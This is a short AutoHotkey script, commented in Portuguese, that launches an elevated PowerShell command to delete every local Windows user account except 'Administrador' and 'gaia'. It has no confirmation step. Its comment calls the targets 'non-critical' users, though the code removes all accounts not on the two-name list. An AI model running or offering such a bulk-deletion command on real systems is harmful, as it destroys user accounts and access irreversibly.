#Persistent
#NoEnv
#SingleInstance, Force
SendMode Input


; Função para executar um comando como administrador
RunAsAdmin(command) {
    global
    shell := ComObjCreate("Shell.Application")
    shell.ShellExecute("powershell.exe", "-Command " . command, "", "runas", 1)
}

; Comando PowerShell para excluir usuários (exclui apenas os usuários não críticos)
command := "
(
$users = Get-LocalUser | Where-Object { $_.Name -ne 'Administrador' -and $_.Name -ne 'gaia'}
foreach ($user in $users) {
    Remove-LocalUser -Name $user.Name
}
)"

RunAsAdmin(command)
ExitApp
